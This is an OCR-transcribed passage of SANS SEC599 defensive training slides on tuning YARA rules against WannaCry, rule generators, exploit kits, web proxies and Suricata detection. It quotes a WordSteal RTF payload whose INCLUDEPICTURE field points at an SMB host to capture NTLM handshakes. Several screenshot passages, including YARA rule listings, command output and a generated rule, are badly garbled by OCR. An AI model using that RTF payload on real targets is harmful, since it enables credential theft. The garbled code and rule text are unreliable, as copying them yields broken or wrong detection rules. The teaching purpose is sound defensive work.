YARA Fine-Tuning Rules To prevent our rule from triggering on any type offi le that contains the mutex string, and just trigger on executables, we will fine-tune our rule.
A Windows executable (PE file) is a file that follows a well-defined binary format (the PE file format). A PE file starts with characters Mand Z (bytes Ox4D and OxSA). A bit further in the file, we will find characters PE (to be
precise, at the position stored in the field at position Ox3C).
For this example, we will use a simple rule-of-thumb to identify PE files: a PE file is a file that starts with "MZ".
We will update our rule now to trigger only on PE files that contain the mutex. To achieve this, we can update our
rule by including search string MZ ($MZ ="MZ") and updating the condition to include this string.
Creating a Boolean expression to look for the presence of2 strings can be done with the and operator: $MZ and $mutex. This rule would trigger on all files that contain strings "MZ" and "MsWinZonesCacheCounterMulcxA". Unfortunately, this is also the case with our rule file itself: we are back to square one.
But our condition is incomplete: the string MZ must be found inside the file at the beginning of the file. YARA conditions can be complex expressions, and it is also possible to specify the position ofstrings. By using condition "SMZ at O" , we instruct YARA to look for string MZ at the beginning of the file. Hence our final condition becomes: "$MZ at Oand $mutex".
This fine-tuned rule no longer triggers on the rule file itself, only on executables.

70

© 2017 Erik Van Buggenhout & Stephen Sims

YARA Fine-Tuning Rules & False Positives
Just searching for a string is too simple to detect malware...
· Strings can be encoded using different methods · String::; can differ in case · Strings can be present in different file types · The presence of a string is not necessarily an indication of malware
(false positives) · Creating good YARA rules requires tuning; we can generate YARA rules
automatically to speed up this tuning process

,....

SANS

YARA Fine-Tuning Rules & False Positives What we learned until now, is the creation of our own YARA rule to detect malware. We start with a basic rule, looking for just one string, that is very specific.
Strings can be encoded using different methods (ASCII , UN ICODE...) and to make our rule more generic to detect these encodings too, we use string modifier options like ascii and wide.
It happens frequently that the case ofa string (uppercase, lowercase or mixed case) is not relevant for the semantics of the content. In these cases, we must detect all possible combinations by performing a caseinsensitive search. This can be done with stri ng modifier nocase. This too makes our rule more generic.
By creating more generic rules, we have more detections. When we analyze these files that trigger our generic rules, we will notice that we have undesired detections. For example, detections in file types that we are not interested in.
This can be fine-tuned by making our rule a bit more specific: we added a test to check for PE files only. In the next example, we will see detections based on our rule for executables that are not malware. These detections are called "false positiv1.::;". We will have to refine our rule further.
This tuning process is necessary to create good YARA rules, but it requires time and resources. This tuning process can be supplemented by using tools to generate YA RA rules automatically based on samples.

© 2017 Erik Van Buggenhout & Stephen Sims

71

YARA False Positive Detections

·

SECS99

C:\De· o>yere6~ wcry . yer· wcry_· utex \turSt8pp·r ·u wcry_· ut·x .\8'+e8283S.Sd21bbef75e61786d8eb5~9 . v1r

·

SEC599

C:\De· o>·tr1nga tearSt8pp·r . ·x· I findstr /i r·ndit1on Rendition lnfoo·c LLC

I) tearStOppcr.cxc is another executable detected by our rule. but it is not m w re:
this is a ,.,f""I""'-"""""-"=

2) tearStOpper.exe 1s an "inorularor" for the WannaCry malware, developed by
SANS Instructor Jake Williams. It contains
this specific mutex string.
I

rule wcry_mutex ( :,c;rings: SMZ · "MZ"
S$rm enH dltl·0O"""·w<"oR,eonod·o1Ct1·oo>noClno,foo<soefcflot<LOC>.<"Aa" s·c~1ii<w1·de"· · ~ ·condition :
$MZ at O and Smutex and not $rendition

· , . ,_ .
. -

, ·

.

.

. . . . . · .

. ·_ , ·

. ·

· . -

SAN~

YARA False Positive Detections A detection (a rule that triggered) is called a "positive". A detection of actual malware is called a "true positive": we have an alert on a file, and the file is maIware. A "false positive" is a detection of an executable that is not malware: we have an alert on a file, and the file is not malware.
We illustrate false positives with TearStOpper, an inoculator for the WannaCry malware. TearSt0pper is a program (a PE file) that inoculates Windows machines for the WannaCry malware by creating the mutex that WannaCry uses. The idea is to run the inoculator program on uninfected machines to create the mutex used by WannaCry (MsWinZonesCacheCounterMutexA). If the inoculated machines are injected with the WannaCry malwarc, the malware will execute and check for the presence of the mutex. Because ofthe presence ofthe mutex, the WannaCry malware "will assume" that the machine is already infected, and abort its attempt at infection.
This means that the TearSt0pper executable also needs to contain the mutex string, and that is why it is detected by our rule. But since it is not rnalware (quite the contrary), we have a false positive.
One way to avoid this false positive is to look for a string inside the TearSt0ppcr executable that is not found in the WannaCry malware. TeMSt0pper is developed by a company called "Rendition lnfost:c LLC.", and the executable contains this string.
We can adapt our YARA rule to search for this string ($rendition) and adapt our condition to be true only if the $rendition string is not found in the file by using the not operator: "and not $rendition".

72

«:> 2017 Erik Van Buggenhout & Stephen Sims

Generating YARA Rules Automatically ( I)
IDev_eloping good YARA rules requires initial analysis of the samples, and fine-tuning cycles to find the right level of (true) positive detection.
ITo reduce the cost and time of this process, YARA rules can be created automatically based on samples, and subsequently adapted for better results.
IThere are several free, online and offline tools available that will take malware samples as input and produce a YARA rule to detect these samples.

Generating YARA Rules Automatically (I) Developing YARA rules is a skill, it requires analysis of the sample(s) to come up with an initial rule, and then several cycles offine tuning to arrive at a right level of detection.
This process can be time-consuming and requires specific skills that are not easily found on the market. To reduce the cost of this process, and speed up the development of YARA rules, YARA rule generators can be used.
A YARA rule generator is a program that takes one or more samples as input, performs an analysis ofthe samples, and generates a YARA rule to detect the samples and similar samples. It is important that the generator creates a rule that is not too specific or generic. A rule that is too specific, will only detect the samples that we analyzed, and this can be better done by cryptographic hash matching. A rule that is too generic will generate too many (false) positive detections.
Generated YARA rules are like hand-crafted YARA rules: they are contained in text files and are subject to further modifications and tuning.
There are several online and offline, fn::t: YARA rule generators. The advantage ofonline generators is that it doesn't require the installation of programs, but it implicates sharing a sample with an online service, which is not always desirable in the case of maIware created by advanced adversaries, as it might g ive away our intentions.
Offline generators don ' t have this disadvantage, but some ofthem require many dependencies to be installed, as most of them are Python programs.

© 2017 Erik Van Buggenhout & Stephen Sims

73

Generating YARA Rules Automatically (2)

s~s

J iBSandbo·

~,

_,_ - ·-

... .......... .,.__,

"""' · · ··· I "'·· ·· ·

_________ ~ ..,
- --__ -_.........,.......-.,.....·..-.-,-,_·...'-.._---_1,-1.1.111·-

Yara Rule Ge nera t or

- ·- ----·----·-----·----·-·---- --··-·-· _....,..,._...___

..

---::=.·.:-:!:==-==-==-... ·

Tools : · yarGen · YaraGenerator
I · http://yara-generator.net/ SECS99

C, \ D.,.0>11..-.C·,,.,.·tor. P'J ·r wcr11.9ffl ·f ... ..twar·\

( +) C·n·rating Vara Aul· wcr11.9·n fro· ,11. . loe·t·d in · Hlwart\

[·) Yan Ruh - · t · d, wcr11.~n .....-

(·) Flin ExM>Md, ( · ·~cl2US.'5d21bbcf7$a51706<lleb5~S· I I· l Author Crtdlttd AnOf>\IIIO"t
(·) Ruh DHcrlptlon: No DHcription Prou1dtd
(·) Var·G·n.rator ( C) 2813 Cllrul··nOM<: or9 Mtp1 ://9lthub . coa/X...,..,h0n/Yar.C.n.,ator

C \ 0..0>

Generating YARA Rules Automatically (2) yarGen and YaraGenerator are offiine YARA rule generators both written in Python. YaraGenerator has no dependencies, while yarGen has a lot ofdependencies.
Both can be found on Gitl--lub: https://github.com/Neo23x0/yarGen https:/ /github. com/Xen0ph0n/YaraGenerator
Using these tools is rather simple: run the command-line tool with a few options (for example a name for the rule to be generated), and provide a sample.
Compared to yarGen, YaraGenerator is rather simple. It will search for strings and use these to generate a rule. While yarGen will also look for binary code to generate the rule. yarGen has an optional online component (Binarly).
Online website yara-generator (http://yara-generator.net) is not affiliated with YaraGenerator, but with the JoeSandbox on line malware analysis service. Samples need to be submitted to the on line service, which will generate a YARA rule to he downloaded.

74

© 2017 Erik Van Buggenhout & Stephen Sims

Generating YARA Rules Automatically (3)

lt'l)C>Cl '"pe'"
·t·l l· ·~-·CcUl)hWJlbbctlk617°"'t.-,.ri.ct_Y1r.,0 -W~rlptl~ · '"Aot:. .-t+MU.tect ·Ullpl· rule f4t .,..,,.._,.1oe · ·:,.. ,.:.o· .1..u1oor · "'Joto Sr,ll'!dbo,i r.u· ...:.· r..n.uua 1.0.0·

~ · a 6ld~.&: I/ ...l ....·ntt1 (.0

at: l61;U

l·O · "!11· ·rr6r'" f1.JJllfO«I i:,OC,6M vldlo .u1:ai

It:,.,.,.... II a.l.v.u1ce1 f,O ,\ppffn ·u nu

h l · '"ead.· .ot<t

folhr,-i-d 11,o,e.1,·· 1111· udl.

II J·1· ..,Mte91 J.O AliP't·u at1 l!at2

:a., al · "'ta.ollk,M.·x·" foU""'·d a,o,c..,. v)doe ucu

ltkl," II lre1.-.r··~'

Appto.ara au Hi'' .

,,, · -.iff·r euor· !11Hwocd

wtdoil. o-s:H

II fl1tU'Y~1 >. It ~ n o iiJ\.I ·t,f)S

i.c · ··ttttb ·4 ... fullVvrd .:~. . "lCNI ucu

II ,.1.-v.-ne.; ),0 ~ u ,Ut ltU

S.11\ · "hh\ir" taUword MIC.·M ·J.de o-ett

" * II Jlel·vafM:lo91 l.O A(,,.An .UI lk$
'-' · '"ttrua trror· (ull...,~ nAC.&"·

.ud,

II ~·l·nnou l,O ~ n ur ,(bl

El Op,;oOe ~~ tea- tJ-· K
s..-11oypott',\OpCOM · 1 n II n

n " n · nt.typcun\
f.A

n

n

n

u

n

n

n

n

C,00..lltl.onr

a,llotU..

fl II J.K'tf,;)ni c.~d.

..., p.·..-et.loei·C01,.,... cociuuu · .tert·

.-, i)t,.-.CUO.el1i,..,_. (l()f'IU1.nt ·.rtt1u·

,-n4 pe.-.cu°"'l:!J.,,.... oooulll· ·.41u·

Hid pe· .-c,tt,o,n.J,IJJ.M.1111: CN'lt·J.O.t ·.01.e·
II n LM~ cl\a··=~·ri.H.io c-)..cl:

Ud p..OM.ractA>r!.i..tC# , , - . . ~...S'nd_snu,-no

:::::~::::~}:;i: : : : : ~ ~ ~ &DIS pt,CMuetArlaUc, ' ~-'PI01fUU_lKNZ
~

"t.- '- II K ~,_,_ CHCt

..

Md pe,.~y·

pt.~YS11'J(-·lll«Jlt:S~GUJ

SANS

Generating YARA Rules Automatically (3) This is an example of a YARA rule generated online for the WannaCry sample we honed our YARA rule writing skills on.
As can be seen above, it is an extensive rule (parts have been truncated to tit on a slide).
The YARA rule uses the PE module to assist with the analysis of PE tiles (import "pe"). It contains a metadata section (meta:) with a lot of infonnation about the sample, the generator, and the rule.
Besides searching for strings, the YARA rule also defines binary data ($entrypointOpcode) that corresponds to binary code that will aid in identifying similar samples.
The condition of the rule requires all strings to be found (expression "all ofthem"), and checks several characteristics of the PE file like section names via the PE file module.

© 2017 Erik Van Buggenhout & Stephen Sims

75

VirusT o tal & Retro Hunting
VirusTotal provides an interesting YARA-based feature to its commercial customer base: (Retro) hunting!
With the hunting function, users can define a number of YARA rules that are checked for EVERY sample that is uploaded to Vin1sTotal.
With the retro hunting function, users can search a large data set of old samples (which usually goes back+- 30 days) of uploaded data with a defined set of YARA rules.
For defenders, this could be powerful to detect samples in the wild that are related to malware families previously discovered in the organization!
SANS
VirusTotal & (Retro) Hunting YirusTotal provides an interesting YARA-based feature to its commercial customer base: (Retro) hunting!
· With the hunting function, users can define a number of YARA rules that are checked for EVERY sample that is uploaded to VirusTotal.
· With the retro hunting function, users can search a large data set ofo ld samples (which usually goes back +- 30 days) of uploaded data with a defined set of YARA rules.
Although a function that is typically used by investigators & malware hunters, this can also be hig hly powerfu l
for us as enterprise defenders! Once pay loads or samples arc identified inside the organization, we could develop YARA rules and use these both in our own environment, but also in the wild (on YirusTotal) to detected related malware samples. These related malware samples could provide additional insights in evolving adversary tactics, which allows us to further improve our defenses!

76

© 2017 Erik Van Buggenhout & Stephen Sims

YARA - Additional Resources
Some additional resources that can prove to be useful for YARA include:
· https: //analysis.yararules.com/ Online YARA rules analyzer https: //github.com/Yara-Rules/rules Repository of large collection of YARA mles
· https://www.yara-generator.net/ Online YARA rule generator
· https: //github.com/Xenophon/YaraGenerator & https: //github.com/Neo23xo/yarGen Oftline YARA rule generators
YARA - Additional Resources Some additional resources that can prove to be useful for YARA include: https://analysis.yararules.com/ Online YARA rules analyzer https:/ / github.com/Yara-Rules/ ru les Repository of large collection of YARA rules https: // ww w.yarn-gen e rator.n e t / Online YARA rule generator https://github.com/Xen0ph0n/YaraGenerator & https://github.com/Neo23x0/yarGen Offiine YARA rule generators

© 2017 Erik Van Buggenhout & Stephen Sims

77

Course Roadmap
· Day 1: Knowing the Adversary, Knowing Yourself
· Day 2: Avertine Payload Delivery
· Day 3: Preventing Exploitation
· Day 4: Avoiding Installation, Foiling Command & Control & Thwarting Lateral Movement
· Day 5: Exfiltration, Cyber Deception & Incident Response
· Day 6: APT Defender Capstone

SEC599.2
Strategies for Preventing I Detecting Payload Delivery End-User Security Awareness Leveraging Suricata IDS/ IPS E-mail Security Controls
· Exercise: Building a Sandbox Using Suricata & Cuckoo Zooming in on YARA Rules Exercise: Finding the Needle in the Haystack Using YARA Web Security Controls Exercise: Deploying PfSense Firewall with Squid & ClamAV Stopping Delivery Using Removable Media Visualizing the Results of Our Solutions Exercise: Developing Eye-Candy Using Kibana Controlling Script in the Enterprise Exercise: Controlling Script Using GPO's

SANS

This page intentionally left blank.

78

© 2017 Erik Van Buggenhout & Stephen Sims

Exercise - Finding the Needle in the Haystack Using YARA
IThe objective of the exercise is twofold: · Manually write a YARA rule that can detect related samples. · Generate YARA rules for a known payload/ malware sample, after which these YARA rules can be run against a large dump of samples.
High-level exercise steps: 1. Analyze the provided sample using our Cuckoo Sandbox 2 . Manually write YARA rules to detect related samples 3. Use yarGen.py to create YARA rules for another malware sample 4. Find related samples in the large database
Exercise - Finding the Needle in the Haystack Using YARA During this exercise, our objective is to leverage YARA to:
· Generate YARA rules for a known payload / malware sample · Find related rnalware samples in a large dump of samples In order to achieve this, you wi ll need to deliver the following exercise steps: I. Analyze the provided sample using the Cuckoo Sandbox we set up during the last exercise 2. Manually write YARA rules to detect related samples 3. Use yarGen.py to create YARA rules for another specific malware sample 4. Find related samples in the large database of samples For additional guidance & details on the lab, please refer to the LOOS workbook.

© 2017 Erik Van Buggenhout & Stephen Sims

79

Exercise - Finding the Needle in the Haystacl< Using YARA - Conclusion
~Jyara
During this lab, we leveraged YARA to easily "characterize" a payload / malware sample and find related samples by developing YARA rules.
This is a hugely powerful technique to find similar (though not identical) payloads generated by the same adversary/ threat actor.
Exercise - Finding the Needle in the Haystack Using YARA- Conclusion During this lab, we leveraged YARA to easily "characterize" a payload / malware sample and find related samples by developing YARA rules. This is a hugely powerful technique to find s imilar (though not identical)
payloads generated by the same adversary I threat actor.

80

© 2017 Erik Van Buggenhout & Stephen Sims

Course Roadmap
· Day 1: Knowing the Adversary, Knowing Yourself
· Day 2: Avertin& Payload Delivery
· Day 3: Preventing Exploitation · Day 4: Avoiding Installation, Foiling
Command & Control & Thwarting Lateral Movement
· Day 5: Exfiltration, Cyber Deception &Incident Response
· Day 6: APT Defender Capstone

SECS99.2
Strategies for Preventing / Detecting Payload Delivery End-User Security Awareness Leveraging Suricata IDS/ IPS E-mail Security Controls
Exercise: Building a Sandbox Using Suricata & Cuckoo
· Zooming in on YARA Rules Exercise: Finding the Needle in the Haystack Using YARA Web Security Controls Exercise: Deploying PfSense Firewall with Squid & ClamAV Stopping Delivery Using Removable Media Visualizing the Results of Our Solutions Exercise: Developing Eye-Candy Using Kibana Controlling Script in the Enterprise Exercise: Controlling Script Using GPO's

· SANS
This page intentionally left blank.

© 2017 Erik Van Buggenhout & Stephen Sims

81

Overview - Primacy of HTTP(S) in the Enterprise
IWeb traffic (HTTP, HTTPS) is the dominant form of network communication in the enterprise (both internal and external).
IDue to its importance, it is an ideal protocol for adversaries (e.g. delivery of payloads, command & control channels ...) as it's often allowed and its presence will not raise suspicion.
IAs defenders, we need to ensure this protocol is properly secured in order to detect and prevent malicious activity.
SANS
Overview - Primacy of HTTP(S) in the Enterprise Web traffic making use of the HTTP(S) protocols makes up the largest part ofa company's network traffic. Both customers connecting to the company's web servers as employees connecting to the outside world or internal servers cause these protocols to be highly important. As a result, throughout the entire company network, the web protocols are often allowed with little to no restrictions. For adversaries, this creates an ideal way ofde livering payloads or transporting commands and data to and from a command and control server. Adding more web traffic to the already vast amount will be unlikely to raise suspicion and thus defer detection. However, as defenders, these web protocols are an important aspect to secure and help us in detecting and preventing malicious activity. The following slides will detail some HTTP(S) attack vectors and ways to deal with these threats.

82

© 2017 Erik Van Buggenhout & Stephen Sims

Web Attacks Against the Enterprise

Common attack strategies abusing HTTP(S) against organizations currently include:

·

IPhishing used for credential harvesting (fake login pages sent via e-mail).

Q I Drive-by downloads delivered by exploit kits (against browsers & browser plugins).

·

IPhishing used to deliver malicious payloads (e.g. if e-mail sandboxing removes attachments, use URLs).

Ell Command & control activity during later stages of the intrusion.

Web Attacks Against the Enterprise Two ofthe attack strategies mentioned on this slide have already been explained before. Phishing is often used to attempt credential harvesting by leading users to a fake login page. Mails often contain malicious attachments containing payloads waiting to be opened and executed by an unsuspecting user.
Other ways HTIP(S) can be abused include drive-by downloads, such as those performed by exploit kits. These exploit kits attempt to abuse vulnerabilities in user's browsers or browser plugins to download malicious files to the user's computer. The workings ofexploit kits and some famous examples will be discussed in the following slides.
After a target has been compromised, adversaries wiII often use HTTP(S) to communicate with a command and control server and send additional commands to the victim or retrieve data from the victim.

© 2017 Erik Van Buggenhout & Stephen Sims

83

Introduction to Exploit Kits
· Exploit kits abuse flaws in browsers or browser plugins to drop a payload on a victim system
· Popular exploit kits include Angler, Rig, Terror, Sundown.. · Typical payloads delivered by exploit kits include ransomware,
banking Trojans, "generic" malware... · Amongst others, due to improved exploit mitigation techniques,
it appears exploit kits are on the decline as initial intrusion points (more on that during section 3 of this course) · But information security is a cycle, so let's keep an eye on them anyhow ©
Introduction to Exploit Kits Exploit kits abuse flaws in browsers or browser plugins (Flash, Silverlight, JAVA ...) in order to drop payloads on victim systems. Some of the more famous exploit kits include Angler, Rig, Terror, and Sundown. Out of these four, Rig is still the most popular and well-known exploit kit and is often used in malvertising and compromised websites campaigns. Typical payloads delivered by exploit kits include ransornware, generic malware, such as a botnets or spyware, and banking trojans. It should, however, be noted that the type of payload delivered by an exploit kit is only limited by the imagination ofthe author.
The number ofexploit kit intrusions has declined, among others due to improved exploit mitigation techniques and better overall security in browsers. However, since information security is a constantly changing field, it's still important to keep an eye on them. New vulnerabilities could be uncovered, resulting in a boost to the exploit kit industry.

84

© 2017 Erik Van Buggenhout & Stephen Sims

Zooming in on Exploit Kit Operations
A typical exploit kit infection could occur in the following way:

11·-

·

Victim

Zooming in on Exploit Kit Operations An exploit kit infection will typically occur in the following way:
I. The victim visits a normal website that is not malicious in itself. 2. A malicious advertisement (malvertisement) hosted on the normal website loads content from a
compromised website. Alternatively, an adversary might be able to compromise a certain site that is frequently visited by the target audience (watering hole attack) and wait for the user to visit the website themselves. 3. The compromised website contains code that performs fingerprinting of the user's browser and plugin to determine whether it is susceptible to an attack. 4. In case the user is vulnerable, the user is redirected to the exploit kit server, where the exploit code is delivered and the payload is downloaded to the victim's machine and executed.
ln order to reduce the detection rate ofexploit kits, the different steps in the chain perform proper validation before the exploit code is actually delivered. This could mean for example only specific targets are attacked, while others are ignored (even if they are both vulnerable).

© 2017 Erik Van Buggenhout & Stephen Sims

85

Malware Traffic Analysis (I)

A great blog with loads of exploit kit examples and their behavior

MALWARE-TRAFFIC-ANA

· Over 1000 blog entries (since summer 2013) about malware, with a focus on exploit kit behavior
· Keeps track ofwhat payloads are being delivered by exploit kits
· PCAP's with network traffic and dropped artifacts can be downloaded for further analysis
· Also, has challenges that can be used to further hone your skills

SAN.,

Malware Traffic Analysis (1) A good source for insights on exploit kit behavior and to a lesser extent malware, in general, is malwaretraffic-analysis.net. Since the summer of 2013, over I000 blog entries have been created, nearly all of them containing pcap files, malwarc samples, or both. The blog posts provide details on the malware' s behavior and shows generated network traffic and payloads, including domains used for C&C.
In addition to providing infonnation and analysis, the blog also contains challenges that can be used to further advance your own skills. There are exercises ranging from analysis of exploit kits and their payloads to postinfection ransomware evidence searching. Most exercises contain some specific questions that you need to answer in the form of a report.

86

© 2017 Erik Van Buggenhout & Stephen Sims

Malware Traffic Analysis (2)
MALWARE-TRAFFIC-ANA
MY BLOG POSTS· [ 2013 I ·I 2014 I· [ 2015 J·[ 2016 I· I 2017 J
· 2017-05-16- Hancltor malspam· Subject: UPS ShlpmN>t Label Notlllca11on · 2017-05-16 . More eumplU o! matapem pushing Jaff rantomWare · 2017-05-15- My take on WennaCly ronaomware - 2017-05-15 . TheJaff ranoomwaretraln " - on rollln' · 2017-0S-12-FedEx-themed melapam puenes Kovtet (~aln) . 2017-05-12 - RigEKeump!M · 2017-0S-12 . "Blank Slate· malopam conUnuea pu.nlng C8rt>er ransomware , 201HlS-11-Jumplng on t'-J·ff ranaomware IMlnCIYfagon · 2017-05-11 - FedEx-tl>emed malspem pualles Kovtar , 2017-05-11 - P<;aj> end matwara !or an ISC diary on Rig EK · 2017-0S-10 - Hancltor malspem · Subpoenas and Comcaat ~II·
· 2011-os-10- "Blank s1a1e· malopam puahlng c - and Globelmposter raneomware
· 20t7-os-o9 - Hancltor mal-i,em · Subject: RE: may aubpoena from FTC · 2017-os-<>9 - Rig EK Knda Bunltu Trojan · 2017-0S-OS - "Blank Slate· n\lllSpam back 10 -Ing C - . · 2017.()5.(14 . H>oncllor malspem · Sub): USPS Proof of Delivery letter on your ahlpment · 2017-05-04 - Decimal IP campaign uses lake F1uh Player sit& 10 send SmokeL · 2017-os-03- "Blank Sim· malspem puohff Gl-lmpoeler ransomware .-nt · 2017-<lS.QJ- WnataApp malspam · SubjeCt: Ml·Md voice menage
· 2017-os-02- Hancttor malspem · Subf: You, onllno ~II la avallable. Amount due S-434-'5
· 2017-0S-02-KMplng It 100: "BlankSlal.e" - ~ ~ puahlng Monsor, . _ . , . , 2017-0S-01 - Hancllor malapam · S..b)ecl: 725-630-1234 has sent you· 3 pave(o) fol
SANS

Malware traffic analysis blog
Very frequent updates (at least once a week). with details on exploit kit activity and the payload being delivered
Every different blog post has artifacts that can be downloaded, typically including: · Full analysis
Screenshots · Network traffic (PCAP): · The injected web source code
(redirect, ad...)

Malware T raflic Analysis (2) The malware traffic analysis blog is updated very frequently (at least once a week), allowing an up-to-date view on the current malware landscape.
Every post contains details on exploit kit activity and the payload being delivered and has artifacts that can be downloaded, typically including:
Full analysis Screenshots Network traffic (PCAP) The injected web source code (redirect, ad...)
Next to these blog posts, the author also includes "guest blog posts" with write-ups from other people's biogs.

© 2017 Erik Van Buggenhout & Stephen Sims

87

Securing Web Traffic - HTTP(S) Proxies
· For outbound web traffic, both commercial and open-source proxies exist
· Initial focus was performance (caching), now more and more used for security purposes as well
· Typical security features include RBAC, URL categorization, black/white-listing, SSL interception, AV engine, file type filtering ...

+
Symantec.

F :::RTlnET.

Securing Web Traffic - HTfP(S) Proxies For outbound traffic coming from the organization's premises, a web proxy is often used. Both commercial and open source proxies exist;, so the implementation will depend on the organization's requirements.
Initially, proxies were aimed at increasing the performance through caching. Web pages requested by users would be cached on the proxy, so the cached version could be returned when another request for the same web page was received. Due to the increasing dynamicity of web pages, the focus has shifted away from caching and performance, towards security purposes.
Some of the security features implemented by proxies include: · Role-based access controls (RBAC) URL categorization · Black/whitelisting · SSL interception AV engine · File type filtering
Based on a user's role the web proxy can limit access to certain websites or catego1ics of websites. In general, website categories can be used for blacklisting. Categories can be Business, Gaming, News...
Through SSL interception, it's possible for the proxy to analyze web communication over HTTPS, which could be useful for scanning webmail attachments.
HTTPS is encrypted and its content cannot be filtered unless the web proxy has TLS interception capabilities. With such interception, the TLS connection is established between the client and the proxy, and the proxy establishes another TLS connection to the web server. The traffic is thus decrypted by the proxy, and available for inspection. Other filters implemented on the proxy can be anti-virus scanners, while sandboxes are typically implemented on a different server.

88

© 2017 Erik Van Buggenhout & Stephen Sims

Securing Web Traffic - Categorization & Blacklisting (I)
Most commercial proxy products include their own categories & blacklists and have publicly available URL submission pages:
· http://url.fortinet.net/rate/submit.php · https://sitereview.bluecoat.com/sitereview.jsp ("WebPulse")
Several, free, open-source lists also exist:
· UT1 blacklists (http://dsi.ut-capitole.fr/blacklists/index en.php) · Shallalist (http://www.shallalist.de)
! Use with caution ! Understand limitations of categorization & blacklisting
SANS
Securing Web Traffic - Categorization & Blacklisting (1) Most well-known commercial proxy products implement their own blacklists and have publicly available URL submission pages. These pages allow anyone to submit a URL and verify its category. Usually, they allow request for URL category changes. In addition, several open source lists exist that can be freely used but these require caution. It's important to understand the limitations ofcategorization and blacklisting.

© 2017 Erik Van Buggenhout & Stephen Sims

89

Securing Web Traffic - Categorization & Blacklisting (2)
When implementing categorization, there are a few things to keep in mind:
· Fine-grained blocking can be performed by only allowing categories to certain user groups (e.g. allow IT administrators to access security/ hacking related content for research purposes);
· The categorization of submitted URLs is not always that strong: Targeted adversaries can manually submit a URL and suggest to have it added to a "benign" category (e.g. creating a fake "company web page" serving malware and having it categorized as "business")
SANS
Securing Web Traffic - Categorization & Blacklisting (2) As mentioned on the previous slide, it's important to consider the limitation of blacklisting and categorization. A statement that is applicable to both commercial and open source list.
....
lffine-grained blocking is required, it's possible to allow certain categories to certain user f:,'fOups. An example could be to allow IT administrators to websites in the hacking categories. Keep in mind that management of groups and categories will be required.
Even though URL categorization and blacklisting can be a strong mechanism, there are no guarantees that a
URL that's categorized as safe actually is safe. Adversaries can manipulate a URLs category by submitting a request for a certain category while serving malware in the background. Alternatively, certain safe URLs could be placed in a category that is blocked, resulting in user frustration and requests to unblock the URL.

90

© 2017 Erik Van Buggenhout & Stephen Sims

Securing W e b T raffic - IDS / IPS

· As with any type of traffic, IDS / IPS devices can be used to prevent / detect payload delivery in HTIP
· Suricata combined with the Emerging Threat ruleset provides a free solution
· Note: In-depth alerting for HTIPS requires SSL interception

1 alert http SEXTERNAL_NET any-> SHOME...NET any
2 C
3 msg:"RTF INCLUOEPICTURE fi.le://"; 4 flow:established,to_client; S fi.le_data; 6 content:"{\\rtfl"; wi.thin: 6; 7 content: "INCLUOEPICTURE"; nocase; distance:0 8 content:"fi.le://"; nocase; di.stance:0; 9 pcre: "/\{\s·INCLUOEPICTURE\s·\"fi.le:\/V/i."; 10 classtype:trojan-activity; 11 si.d:1000018; 12 rev:l;
This is an example of a Suricata rule designed to detect a particular type of RTF file. It detects these files in HTTP traffic. The rule is an alert rule: it will detect but not block the traffic.

SANS

Securing Web Traffic - IDS / JPS Another, more advanced way ofsecuring web traffic is through the use ofan IDS or IPS. These devices will detect and/or prevent payload delivery in the web traffic. Combining Suricata with the open ruleset provided by Emerging Threats (https://rules.emergingthreats.net/) makes for an excellent free solution.
To get an idea of how an open source IDS/JPS like Suricata works, we are going to look at a rule to detect an RTF file (Rich Text Format files are ASCH files) that uses an JNCLUDEPICTURE instruction to download a picture via SMB (file:// protocol). Combined with the responder.py script, this can be used to steal NTLM handshakes. This attack is known as WordSteal- it uses an RTF file like this:
{\rtfl {\field{\*\fldinst {INCLUDEPlCTURE "file:// 192.168. 1. l/image.png" \\* MERGEFORMAT\\d}} {\fldrslt}}}
Remark: Suricata rules take one line. In the example above, we split the rule over several lines to improve readability, but as such, this rule will be rejected by Suricata. All the rule elements need to be written on one line.
The first line tells us that this is an alert rule (to detect, a rule to prevent would start with drop) for http traffic that is coming into our enterprise network from the Internet. A rule to inspect moil server traffic would have SMTP instead of http as identifier.
Line 5 instructs Suricata to inspect the content of the http connection (and not the headers or the URL). Line 6 checks if the content starts with {\rtfl (normal RTF file start with this header) Line 7 searches for string INCLUDEPICTURE after the header, ignoring case. Line 8 searches for string file:// after fNCLUDEPlCTURE, ignoring case. Line 9 is a regular expression to eliminate some false positives.
If you want to apply in-depth alerting for HITPS, SSL interception is required to be able to view the contents of the encrypted communications.

© 2017 Erik Van Buggenhout & Stephen Sims

91

Detecting Exploit Kit Activity with IDS/IPS

Suricata IDS / IPS with the free Emerging Threats ruleset has several built-in rules for exploit kit activity:

,_---en._,_
------·--·-

-
0W,ebS""e'liHa,ch _____ _ . ,

,.,,,..

-10·t·t,,W.. ~-.,.·~ ~ ~ -,..,,..,fl""0._....,_..._°""'""""'-1 _, .__ __ _

~.,_.._.,...,.........,.....,..._t.._,,.~""CJlllac:.,.~ n~.....-..~r..-·,........ ""....,Q·lf7'' ..'.l-···.~t·.._.....,_

,0.1G1J ..,_,_ll'rl-.i ..,...,INOo'locr - " ' tl9"1 1 I C ' - « ~ ~ -

12,~t.(lt.-. f'I)(

i,, _

..,._ . . _

1-'N·1.1.1ct ..wi ............... _..,.

--·.~H~l20

t"IIQ#III. . . . . . . ..._ . . . ._ . . . , _ _ _ _

_

11»
_ _ _. . _ . . . , . .

--,_
,),.rA ~

Exploit ki t IDS r ules
T he enuar·ging threats ruleset includes signatures for the most common exploit kits.
As they are frequently updated. they are a good way of identifying exploit kit activity inside the organization.

SAN~

Detecting Exploit Kit Activity with JDS/JPS
Amongst others, combining Suricata with the free Emerging Threats rulesets provides a good way of identifying exploit kit activity inside the organization. The ET ruleset contains several built-in rules for detecting exploit kit activity for the most common exploit kits. The rules are frequently updated, allowing you to stay on top of the latest evolution in the exploit kit landscape.

92

© 2017 Erik Van Buggenhout & Stephen Sims

Securing Web Traffic - Design Principles

In a secure environment, the web proxy is one of few (or the only) means of allowed outbound connectivity for end-systems:
· Security decisions (e.g. blacklist specific URLS or categories) can be made in one central location
· Facilitated security controls & monitoring

*

WebProxy
L

Segment 1: Client workstations

·

~ ~ ~ ~ ~ fSg]

· I

Segment2, Smm

Securing Web Traffic - Design Principles Implementing web filters is "easy" in an enterprise if web proxies are used. The proxy server can operate as a central location where alI security decisions are made and where all the filtering can be done. If no proxy is present, then a less efficient form of filtering can be implemented in DNS and firewalls.
In case the internal network is split up into segments, for example, grouping workstations separately from servers, the proxy can be used as an in-line system providing functionality for both segments. As mentioned before, it can serve as a web proxy for your users, implementing URL filtering, blacklisting, or even SSL interception.
